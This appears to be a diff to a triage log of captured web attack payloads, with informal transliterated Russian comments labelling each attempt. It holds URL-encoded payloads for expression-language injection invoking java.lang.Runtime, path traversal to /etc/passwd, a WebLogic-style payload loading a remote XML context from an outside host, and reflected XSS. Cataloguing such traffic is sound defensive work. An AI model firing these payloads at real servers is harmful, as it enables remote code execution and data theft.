@@ -144,6 +144,14 @@ potential_attack = XSS(Reflected)
 payload = actionoutcome%3D%2Fpwn.xhtml%3Fpwned%3D%23%7Bexpressions.getclass%28%29.forname%28%27java.lang.runtime%27%29.getdeclaredmethods%28%29%5B0%5D%7D
 pottential_attack = SSTI via uploaded shell
 
+vrode 78.109.191.117 hz krch ne ponyatno chei ip tupo kashu skinuli
+payload = view%3D..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+potential_attack = Path traversal
+
+payload = _nfpb%3Dtrue%26_pagelabel%3Dhomepage1%26handle%3Dcom.bea.core.repackaged.springframework.context.support.classpathxmlapplicationcontext%28%22http%3A%2F%2F8.8.8.8%3A37225%22%29 kaspi.lab
+potential_attack = vrode os injection ili SSTI + SSRF
+
+
 Mozilla/5.0+(Linux;+Android+7.1.2;+Redmi+4X+Build/N2G47H;+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/110.0.5481.63+Mobile+Safari/537.36 %3Cscript%3Ealert%28%22testbottles%22%29%3C%2Fscript%3E kaspi.lab                 pottential_attack = XSS(Reflected)
 
 
